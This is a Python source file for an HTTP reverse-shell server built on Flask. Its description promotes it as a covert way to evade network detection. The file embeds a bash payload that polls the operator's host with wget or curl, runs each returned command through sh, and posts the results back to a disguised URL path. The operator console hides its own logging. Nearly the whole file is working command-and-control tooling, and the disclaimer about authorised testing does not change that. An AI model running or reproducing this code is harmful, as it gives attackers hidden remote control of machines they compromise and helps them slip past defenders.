"""
Author:     Mr128Bit
Version:    1.0
Date:       28.01.2024

Description:
    
    The HTTP Reverse Shell based on Flask is a tool designed for discreet communication in network environments by leveraging HTTP traffic.
    This tool provides a covert way to establish a reverse shell connection over HTTP, making it less conspicuous and potentially bypassing network security measures.
    By leveraging HTTP traffic, the tool can evade detection mechanisms that may not scrutinize regular web traffic.
    The usage of Flask ensures that the communication appears as legitimate web requests.

        

    This tool is intended for educational and ethical purposes, such as penetration testing and security assessments, with proper authorization. 
    Unauthorized use of this tool may violate applicable laws and ethical standards.



"""

from flask import Flask, request
import os
import time
import random
import string
import threading
import logging


print(".__     __    __               .__           .__  .__") 
print("|  |___/  |__/  |_______  _____|  |__   ____ |  | |  |")  
print("|  |  \   __\   __\____ \/  ___/  |  \_/ __ \|  | |  | ")
print("|   Y  \  |  |  | |  |_> >___ \|   Y  \  ___/|  |_|  |__")
print("|___|  /__|  |__| |   __/____  >___|  /\___  >____/____/")
print("     \/           |__|       \/     \/     \/          ") 
print("="*56)

def generate_web_path():
    # generate random web path (secret) to simualte real web requests

    path_parts = [
    "objects",
    "index",
    "profile",
    "p",
    "about",
    "contact",
    "services",
    "blog",
    "faq",
    "a",
    "el",
    "dashboard",
    "settings",
    "search",
    "checkout",
    "support",
    "o",
    "events",
    "gallery",
    "downloads",
    ]

    num_path_parts = random.randint(1, 5)
    path = "/".join(random.choice(path_parts) for _ in range(num_path_parts))

    return path

def setup():
    # Setup reverse shell and generate shell payload 

    secret = None
    PAYLOAD='SRV="{HOST}"; CMD=""; SECRET="{SECRET}"; if command -v wget &> /dev/null; then CMD="wget"; else if command -v curl &> /dev/null; then CMD="curl"; fi; fi; if [[ "$CMD" == "wget" ]]; then while true; do EXC=$(wget -qO - "$SRV"); RES=$(echo "$EXC" | sh 2>&1); wget -qO - --post-data "result=$RES" "$SRV/$SECRET"; sleep 2; done; elif [[ "$CMD" == "curl" ]]; then while true; do EXC=$(curl -sS "$SRV"); if ! [ -z "$EXC" ]; then RES=$(echo "$EXC" | sh 2>&1); curl -sS -d "result=$RES" "$SRV/$SECRET"; fi; sleep 2; done; fi'
    secret_input = input("Your Secret (skip for random secret): ")

    if not secret_input: 
        secret = generate_web_path()
    else:
        secret = secret_input
    print(">>", secret, "\n")

    host_input = None
    while not host_input:
        host_input = input("Your HTTP/S Host: ")
    print(">>", host_input, "\n")
    gen_payload = None

    while gen_payload not in ("Y", "y", "N", "n"):
        gen_payload = input("Generate Payload? (y/n): ")
    
    if gen_payload in ("Y", "y"):
        print("\n" + "="*10 + " [ PAYLOAD ] " + "="*10)
        print(PAYLOAD.format(HOST=host_input, SECRET=secret))
        print("="*33 + "\n")

    return secret

# Start flask application, disable logging/output
app = Flask(__name__)
app.logger.disabled = True
log = logging.getLogger('werkzeug')
log.disabled = True
# setup & generate secret
secret = setup()

# Command to be executed at time
CMD_ATM=""

@app.route("/", methods=['GET'])
def req():
    return CMD_ATM

@app.route(f"/{secret}", methods=['POST'])
def answer():
    result = request.form.get("result").strip()

    if result:
        # delete current command
        global CMD_ATM
        CMD_ATM=""

        print(result)

    return ''

def process_user_input():
    global CMD_ATM

    while True:
        # set curremt command
        CMD_ATM = input("$: ")

if __name__ == "__main__":
    # start flask in background as thread to allow user input
    flask_thread = threading.Thread(target=app.run, kwargs={"port":80})
    flask_thread.start()

    time.sleep(1)
    process_user_input() 
